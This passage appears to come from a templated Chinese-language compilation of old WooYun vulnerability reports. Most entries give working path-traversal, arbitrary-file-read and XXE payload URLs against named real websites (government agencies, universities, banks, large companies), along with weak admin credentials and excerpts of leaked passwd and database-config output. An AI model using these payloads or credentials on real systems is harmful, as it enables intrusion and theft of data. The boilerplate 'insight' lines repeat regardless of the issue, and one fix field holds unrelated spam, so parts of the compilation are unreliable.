**POC**: 昨天有个大牛哥们为了女神10分钟黑了个icloud钓鱼站，不想今天也收到了钓鱼邮件，也跟着刷了一把。不过骗子的钓鱼站真心做的不咋地。首先说站点：http://**.**.**.**/点进去UI还不错，但是页面基本上没有标签超链接可以点击，除了用户名密码那儿可以输入。发现随便输入什么密码都会提示错误，于是查看源码，发现数据会po到这个页面上。尝试注入,发现最后不管怎样都会有：对站点目录遍历，发现站点权限根本没做防护果断拿wwwroot，松松的把制作人给卖了顺便。。。我还看到有个用拼音写的文件。。。xiugai_email.asp，居然还没有加cookie。。于是smtp邮箱、密码通通都出来。。。

**绕过**: 直接利用

**修复**: 一个钓鱼站把ui做到这样也不容易 还专门去租了个服务器  也算良心权限、用户认证做好  另外，代码好歹封装一下，问题能少很多
---

---
### [wooyun-2015-0128349] 金蝶旗下快递100某处任意文件读取
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://net.kuaidi100.com/youshang-network/logined/auditInfo?method=auditInfoView照片查看任意文件读取，通过 %00截断GET /youshang-network/getImage?path=2015-07%2F2015-07-22%2F../../../../../../../etc/passwd%00.jpg HTTP/1.1Host: net.kuaidi100.comProxy-Connection: keep-aliveAccept: image/webp,*/*;q=0.8User-Agent:Referer: http://net.kuaidi100.com/youshang-network/logined/auditInfo?method=auditInfoViewAccept-Encoding:

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 校验
---

---
### [wooyun-2015-0137883] 凯迪网络某分站任意文件下载
**厂商**: 凯迪网络 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://about.kdnet.net//download.php?file=../../../../../../../../../../etc/passwdmask 区域*****:/root:/**********bin:/sbi**********:/sbin:/sb**********r/adm:/sb**********ool/lpd:/s**********:/sbin:/**********wn:/sbin:/s**********:/sbin:/**********/spool/mail**********ews:/et**********spool/uucp:/**********tor:/root:/**********/usr/games:**********var/gopher:/**********/var/ftp:/s**********body:/:/s

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08348] 快乐购某站点任意文件下载
**厂商**: 快乐购物股份有限公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://scm.happigo.tv/item/download.jsp?file_path=/item/file/%B9%A9%D3%A6%C9%CC%CC%E1%C7%B0%BD%E1%BF%EE%C9%EA%C7%EB%B1%ED.xls其中文件下载路径参数file_path没有对路径进行必要的限制！

**POC**: http://scm.happigo.tv/item/download.jsp?file_path=/item/download.jsp再来套用下之前发现的物理路径泄露信息：E:\web_service\scm_cn\supervision\bank\klgcs2.crtE:\web_service\scm_cn\supervision\bank\klgcs2.key.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2014-047056] 中华人民共和国交通运输部某子站后台弱口令和目录遍历漏洞
**厂商**: 中华人民共和国交通运输部 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中华人民共和国交通运输部某子站后台弱口令和目录可列漏洞：1.管理后台弱口令：http://hudong.moc.gov.cn:2517/admin/用户名：admin  密码：null（空）进入后台可以删除帖子信息，修改用户密码等操作。2.存在目录可列漏洞RUL:http://hudong.moc.gov.cn:2517/opinion/display/Parent Directoryadmin/                 21-Oct-2010 14:51     0Kdisplay/               21-Oct-2010 14:51     0K其中admin/目录可以泄露管理后台地址信息；display/目录可以泄露领导人谈话：http://hudong.moc.gov.cn:2517/opinion/display/images/CL-03.jpg1.管理后台弱

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复建议：1.加强后台密码复杂度，要求至少8位包括大小写字母、数字、特殊字符组合，增加后台验证码的功能。2.加固中间件配置。
---

---
### [wooyun-2016-0170602] 顺电网上商城某漏洞可泄露大量信息(会员信息/订单信息/各种支付Key)
**厂商**: 顺电网上商城 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点http://www.sundan.com/http://www.sundan.com/data/可进行目录遍历

**POC**: 会员信息：收货地址：订单信息：站点配置信息：

**绕过**: 直接利用

**修复**: 静止目录遍历
---

---
### [wooyun-2012-08188] 南方电网国际resin任意文件读取
**厂商**: 南方电网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于网站服务器resin版本存在漏洞，导致南方电网国际网页源代码泄漏。eg：http://www.csgi.csg.cn/resin-doc/viewfile/?file=index.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 联系resin服务器厂商
---

---
### [wooyun-2015-0141363] 开源证券某站点任意文件读取
**厂商**: 开源证券股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.http://**.**.**.**/smenu.php?menu=file:///etc/issue%00&rand=456581210&sid=2.http://**.**.**.**:7001细节：http://**.**.**.**/bugs/wooyun-2014-065752

**POC**: 1.http://**.**.**.**/2.1.http://**.**.**.**:7001/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-087790] 中华人民共和国国家知识产权局分站任意文件下载漏洞
**厂商**: 中华人民共和国国家知识产权局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中华人民共和国国家知识产权局分站提供下载文件功能，使用绝对路径下载，未对path变量进行限制，可修改path变量内容，下载主机系统文件，存在较大安全风险。

**POC**: http://www.pctonline.sipo.gov.cn/index.do?type=download&path=/etc/passwdhttp://www.pctonline.sipo.gov.cn/index.do?type=download&path=/etc/redhat-release

**绕过**: 直接利用

**修复**: 使用相对路径，过滤变量，限制应用用户权限
---

---
### [wooyun-2016-0175174] 宜搜某站存在resin任意文件读取
**厂商**: easou.com | **年份**: 2016 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在问题的网站http://120.197.94.202:8080/可以通过resin的文件包含读取源代码的任意文件同时，这个网站还存在弱口令爆破的问题当用户名输入错误的时候会提示用户名不存在，可以借此爆破用户的密码刚买的Mac，就不继续跑下去了.......

**POC**: 存在问题的网站http://120.197.94.202:8080/可以通过resin的文件包含读取源代码的任意文件同时，这个网站还存在弱口令爆破的问题当用户名输入错误的时候会提示用户名不存在，可以借此爆破用户的密码刚买的Mac，就不继续跑下去了.......

**绕过**: 直接利用

**修复**: 后台和测试系统最好就不要对外。大过年的还在挖洞，多施舍点rank吧
---

---
### [wooyun-2015-0149619] wizBank®学习管理系统任意文件下载漏洞
**厂商**: 汇思软件（上海）有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: wizBank学习管理系统的\www\cw\skin1\jsp\download.jsp文件的源代码如下：<%@ page import="**.**.**.**.*" %><%@ page import="**.**.**.**.*" %><%@ page import="**.**.**.**.*" %><%@ page import="java.util.*" %><%@ page import="javax.servlet.*" %><%String DOC_ROOT = request.getRealPath("/");File targetFile = new File (DOC_ROOT, request.getParameter("file"));response.setContentType("application/stream");response.setHeader

**POC**: 如测试站点http://**.**.**.**:http://**.**.**.**/cw/skin1/jsp/download.jsp?file=../../../../etc/passwdhttp://**.**.**.**/cw/skin1/jsp/download.jsp?file=../../../../etc/shadow成功下载到/etc/password及/etc/shadow文件，如下图所示：测试官网示例站http://**.**.**.**/是否存在该漏洞，构造如下链接下载/WEB-INF/web.xml文件：http://**.**.**.**/cw/skin1/jsp/

**绕过**: 直接利用

**修复**: 对文件下载功能的下载文件名称、类型及路径进行严格的检查和限制。
---

---
### [wooyun-2013-023971] 联通某iweb报表系统弱口令及任意文件下载
**厂商**: 中国联通 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 根据10010.com的ip找到了此IP发现了一个弱口令 admin admin登陆地址:http://211.94.67.214:8080/wrs/rsSecureLogin.do?CmdID=458藐视的华为的系统发现一个任意文件下载：http://211.94.67.214:8080/wrs/attachments.do?CmdID=450&file=D:\HuaweiTechnologies\iWebReportServer\bin\workspace\attachments\1922\Error_Log.txt下载c:\boot.iniwin2000的系统有个数据库的账号密码，结果没连接成功

**POC**: 根据10010.com的ip找到了此IP发现了一个弱口令 admin admin登陆地址:http://211.94.67.214:8080/wrs/rsSecureLogin.do?CmdID=458藐视的华为的系统发现一个任意文件下载：http://211.94.67.214:8080/wrs/attachments.do?CmdID=450&file=D:\HuaweiTechnologies\iWebReportServer\bin\workspace\attachments\1922\Error_Log.txt下载c:\boot.iniwin2000的系统有个数据库的账号密码，结果没

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013717] j2ee分层架构安全（注册乌云1周年庆祝集锦） -- 迅雷
**厂商**: 迅雷 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://caipiao.xunlei.com/WEB-INF/web.xml<beans xsi:schemaLocation="http://www.springframework.org/schema/beans   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd   http://www.springframework.org/schema/tx   http://www.springframework.org/schema/tx/spring-tx-3.0.xsd   http://www.spri

**绕过**: 直接利用

**修复**: 多注意WEB-INF目录！
---

---
### [wooyun-2015-0109199] 畅捷通某站任意文件下载
**厂商**: 畅捷通 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友 /web/common/getfile.jsp 任意文件下载：http://chat.chanjet.com//web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2011-03551] 360网址导航站任意文件读取漏洞
**厂商**: 奇虎360 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看这里：http://hao.360.cn/widget.php?key=../../../../../../../../../../../usr/local/apache2/conf/httpd.conf%00亲widget.php的key变量有问题的啊亲，有不有的亲～

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 支持360。
---

---
### [wooyun-2014-074085] 江苏经济网及下属子站信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.phpinfo 信息泄露http://search.js.cei.gov.cn/test.php2.目录遍历导致下面区域的信息随之泄露http://search.js.cei.gov.cn 后台以及数据库配置中账号密码全部泄露http://search.js.cei.gov.cn/subeifz222/phpinfo.phphttp://search.js.cei.gov.cn/002_jszh/dbconfig/dbconf.inc 数据库账号密码http://search.js.cei.gov.cn/007_hd56info/admin/ 后台泄露http://search.js.cei.gov.cn/007_hd56info/_sql/hd56info.sql 账号密码泄露3.子站数据库的账号密码全部一样。。。参看多个dbconfig文件夹http://search.js.cei

**POC**: 参考上面

**绕过**: 直接利用

**修复**: 权限设置
---

---
### [wooyun-2016-0168151] 格林豪泰某系统任意文件下载涉及内部相关信息泄露
**厂商**: 格林豪泰酒店管理集团 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试地址：任意文件下载，通过遍历fileid值，可以获取内部相关邮件附件信息：weaver/weaver.email.FileDownloadLocation?fileid=**&download=1设置1-4位的参数范围：遍历出多个邮件附件信息：

**POC**: 内部信息泄露：1.投诉信息泄露大量住宿乘客的个人信息（选取一例）2.相关系统部署流程信息3.网络拓扑信息4.商务邮件信息泄露漏洞确实存在，尽快修复吧。

**绕过**: 直接利用

**修复**: 配置访问授权。
---

---
### [wooyun-2015-0102738] 北京航空航天大学任意文件读取
**厂商**: 北京航空航天大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://si.buaa.edu.cn/download.php?file_name=../../../../../../../../../../../../../sbin/../etc/./rc.d/../rc.d/.././passwd先下载，后读取文件·····

**POC**: at:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bashavahi:x:105:106:User for Avahi:/var/run/avahi-daemon:/bin/falsebeagleindex:x:107:108:User for Beagle indexing:/var/cache/beagle:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashdnsmasq:x:104:65534:dnsmasq:/var/lib/empty:/bin/falseftp:x:40:49:FTP acc

**绕过**: 直接利用

**修复**: 大学网站难道就没有waf么···
---

---
### [wooyun-2014-073859] 舜网分站弱口令/几个网站任意文件读取
**厂商**: e23.cn | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://qcyg.e23.cn/phpsso_server/?m=admin&c=index&a=init&forward=用的phpcms账号 phpcms  密码phpcms

**POC**: 一内网数据库信息<查看源文件就能看到密码 了http://se.e23.cn/http://jnhaoke.e23.cn/http://m.e23.cn/任意文件读取http://nt.e23.cn/ 统计流量的就限制外网访问吧可惜太菜 没办法拿shell　 不然可以试试内网渗透了。。

**绕过**: 直接利用

**修复**: 升级cms版本 亲有礼物吗
---

---
### [wooyun-2015-099681] 上海证券交易所IE插件某漏洞可导致用户本地一些信息泄漏
**厂商**: 上海证券交易所 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海证券交易所IE插件导致用户信息泄漏ActV3控件提供的API中，GetLocalFileSize API可以被用来获取浏览器用户的本地文件大小，当文件不存在时返回一个错误号。攻击者可利用这个API来判断被攻击者硬盘目录中是否存在某一特定文件，将需对比的文件名放在数组中，则可实现目录遍历，为更深层次攻击提供情报支持，如确定系统或软件的某一特定文件是否存在来判断被攻击者使用了什么版本的软件和系统，然后可以执行有针对性攻击或漏洞挖掘，或者判断计算机中是否存在某一特定文档来确定该计算机是否是需要攻击的目标。

**POC**: http://biz.sse.com.cn/sseportal/ps/zhs/ca/ca_activex_control_check.jsp可在上面的页面中下载安装ActV3控件。<html>Test Exploit page<object classid='clsid:3DE5C04B-916B-40FC-B976-60119CA5EB21' id='target' ></object><script language='javascript'>document.write("<p/>GetLocalFileSize:can get all types file(file has no lo

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070250] 北邮某网站任意文件下载
**厂商**: 北京邮电大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站上存在的下载链接：http://www.yzb.bupt.cn/admin_upload.php?a1=%BF%BC%C9%FA%D2%E2%CF%F2%B1%ED.doc构造如下链接可下载数据库连接文件：http://www.yzb.bupt.cn/admin_upload.php?a1=../php/student1.php下载passwd文件链接：http://www.yzb.bupt.cn/admin_upload.php?a1=../../../../../etc/passwd

**POC**: 数据库连接文件：http://www.yzb.bupt.cn/admin_upload.php?a1=../php/student1.php<?phpclass student1{public $database ="UTPZrPh90lZJfX6";public $hostname ="oW6tsYyk8AlW2Yx";public $xsdl_XH = "9uD93oHgbYktwlT";public $password = "kjtumiKC-Q5RbMIIfcHaOOF";var $connect;function __construct(){$this->database=$this

**绕过**: 直接利用

**修复**: 貌似北邮会忽略，仅测试下载漏洞，未深入挖洞，鉴于研究生招生网可以发布招生信息公告，早早修复
---

---
### [wooyun-2015-0137347] 威客众测某漏洞导致大量漏洞信息及安全从业者身份证/认证资料泄漏
**厂商**: secwk.com | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 上传功能

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 引自百度攻击人员通过目录便利攻击可以获取系统文件及服务器的配置文件等等。一般来说，他们利用服务器API、文件标准权限进行攻击。严格来说，目录遍历攻击并不是一种web漏洞，而是网站设计人员的设计“漏洞”。如果web设计者设计的web内容没有恰当的访问控制，允许http遍历，攻击者就可以访问受限的目录，并可以在web根目录以外执行命令。漏洞虽小，但是泄漏的信息至关重要，所以我就自评20分了。上传根目录http://www.secwk.com/uploads/上传安全资质认证根目录http://www.secwk.com/uploadshttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/renzheng/http://www.secwk.com/uploadshttps://wooyun-img.oss-cn-beijing.aliyunc

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们是搞安全的，你们懂的
---

---
### [wooyun-2015-0102289] 复旦大学下属部分站点任意文件下载+弱后台密码
**厂商**: 复旦大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.任意文件下载复旦大学社会科学高等研究院：http://www.ias.fudan.edu.cn/File.aspx?filepath=/Default.aspx/Default.aspx 可修改为任意路径下载站点文件。该站也未对用户屏蔽异常信息，能看到源码：2.弱口令纳米加工实验室登录地址：http://login.nanofab.fudan.edu.cn/exe/php/system/login.phpadminadmin后台泄露部分管理员真实姓名和联系方式

**POC**: 已截图，源码就不要贴了吧。

**绕过**: 直接利用

**修复**: 找网站管理员修改程序配置。建议用户使用强密码。
---

---
### [wooyun-2015-0113931] 国家973计划项目某网站任意文件读取漏洞（利用POC需经过一次转换）
**厂商**: 国家973计划项目 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取，不过与wooyun里很多例子不同，这个站点需要使用了base64编码文件名，于是上我大py批量撸之.....http://973.typhoon.gov.cn/down.php?f=L2V0Yy9wYXNzd2Q=[+] http://973.typhoon.gov.cn/down.php?f=L2V0Yy9wYXNzd2Q=root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutd

**POC**: 任意文件读取，不过与wooyun里很多例子不同，这个站点需要使用了base64编码文件名，于是上我大py批量撸之.....http://973.typhoon.gov.cn/down.php?f=L2V0Yy9wYXNzd2Q=[+] http://973.typhoon.gov.cn/down.php?f=L2V0Yy9wYXNzd2Q=root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbi

**绕过**: 编码绕过

**修复**: 过滤 or waf
---

---
### [wooyun-2013-028945] 浦发信用卡服务中心任意文件下载读取
**厂商**: 浦发信用卡 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载文件处变量可控，加之未对引用路径进行限制，攻击者可构造请求恶意下载服务器敏感文件。经过对下载过来的文件进行查看，发现未对服务器(HP-UX)做过基线加固，这个不太科学，随时受不了。要努力学习好中国银监会下发关于银行业加强信息安全建设系统文件的精神，以银行业相关标准和规范为依据，以“全面、适度”为总原则，结合浦发银行实际，借鉴行业内外先进经验，对浦发银行信息安全状况进行全面差距分析，规划设计一套适用于自身的信息安全保障体系，实现“事前预防、事中监控、事后处理、必要时应急”的全周期信息安全管控机制，制定出短、中、长相结合的浦发银行信息安全整改实施计划。全面提高浦发银行信息系统的可用性、保密性和完整性，降低信息安全事件发生的可能性和信息安全事件发生的损失。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 现在有些女孩子，整天在微信、微博上和男人打情骂俏、勾勾搭搭，聊不了几句就见面开房，是感情如儿戏，一点也不知道自重。对于这样的女孩，我只想说4个字：请联系我。
---

---
### [wooyun-2016-0168497] 联想某分站信息泄露漏洞(数据库账号/密码/可外连)
**厂商**: 联想 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: LSRC最近活动做的不错，就支持一下LSRC的建设，挖了挖，全程都用自动化的工具，要感谢lijiejie的神器了。。我是这么玩的，subDomainsBrute+bbscan+小脚本，代码如下：#coding:utf-8import osimport datetimeimport sysdef haveallUrl():#os.getcwd获取当前路径#os.listdir获取当前目录下所有文件listfile=os.listdir(os.getcwd())for filename in listfile:#筛选文件名中有txt的文件if ".txt" in filename:#获取文件的创建时间，判断创建时间晚于8号的进行读取文件中的URLfilecrtime=datetime.datetime.fromtimestamp(os.path.getmtime(filename))if st

**POC**: 成功连接，如图：

**绕过**: 直接利用

**修复**: svn检出使用正确的命令
---

---
### [wooyun-2015-0105583] 对北京致远协创软件有限公司官方网站的一次渗透性测试
**厂商**: seeyon.com | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由任意文件下载到读取数据库配置文件查看伪静态文件http://www.seeyon.com/.htaccessphpinfohttp://www.seeyon.com/phpinfo.php物理路径泄露http://www.seeyon.com/inc/db.php

**POC**: 任意文件下载读取数据库配置文件http://www.seeyon.com/downfile.php?file=/../inc/conn.phpseeyon用户允许远程连接，利用navicat链接，成功控制数据库或者使用seeyon自带的phpmyadmin可查看管理表、用户表、招聘表内容放假了，没时间继续深入了，就做到这里吧。对了别忘记确认漏洞！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-09341] 艾格中国（Etam）任意文件读取漏洞
**厂商**: 艾格中国（Etam） | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL：http://www.etam.com.cn/api/xmlrpcpost数据:<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>

**POC**: passwd文件内容:root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail

**绕过**: 直接利用

**修复**: 1.检查所使用的底层xml解析库，默认禁止外部实体的解析；2.更新补丁：存在漏洞的版本: 1.11.111.12.0 RC12.0.0 beta4等更早版本漏洞修补后的版本: 1.11.121.12.0 RC22.0.0 beta5修补方案：根据相对应的版本进行升级升级地址链接: http://fr
---

---
### [wooyun-2015-0101706] 中关村在线某站配置不当致任意文件读取
**厂商**: 中关村在线 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://my.zol.com.cn/app/app.php?aid=6&userid=Pledger&c=book&m=my&url=%00../../../../../../../../etc/passwd

**POC**: 如上所述

**绕过**: 直接利用

**修复**: 修改配置
---

---
### [wooyun-2012-013565] 新浪某站任意文件读取
**厂商**: 新浪 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.Resinhttp://xbol.game.sina.cn/2.读取配置文件http://xbol.game.sina.cn//resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml3.源码http://xbol.game.sina.cn//resin-doc/examples/ioc-periodictask/viewfile?file=admin/mbean.jsp

**POC**: http://xbol.game.sina.cn//resin-doc/examples/ioc-periodictask/viewfile?file=admin/mbean.jsp<html><head><title>admin/mbean.jsp</title><style type='text/css'>.code-highlight { color: #1764FF; }.face-xmlelement { color: #003DB8; font-weight: bold }</style></head><body bgcolor=white><b>admin/mbean.jsp</

**绕过**: 直接利用

**修复**: ....
---

---
### [wooyun-2014-071956] 国家知识产权局某管理系统任意文件遍历漏洞
**厂商**: dlgl.sipo.gov.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 提交http://dlgl.sipo.gov.cn/freeze.main?filePath=../../../../../../../../../../etc/passwd&txn-code=ImgOutServlet&type=agent，可读取相关文件信息：

**POC**: 1.读取操作系统类型，中标麒麟linux5.42.读取apache配置文件3.通过passwd文件知道服务器用的weblogic,提交http://dlgl.sipo.gov.cn/freeze.main?filePath=../../../../../../../../../../app/bea/.bash_history&txn-code=ImgOutServlet&type=agent,查询其输入过得命令：4.通过历史命令记录查询得知服务器中间件目录为 /app/bea/TongWeb_scd5.0/，web应用目录为/app/bea/DLGL/ROOT20130816/ ，提交http

**绕过**: 直接利用

**修复**: 过滤filePath的输入。
---

---
### [wooyun-2015-094489] 湖南经济电视台车辆管理系统任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遍历任意下载http://61.187.53.67:7000/download/download.php?file=../../config.inc.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-035131] 联想某站点任意文件下载可读取服务器任意文件
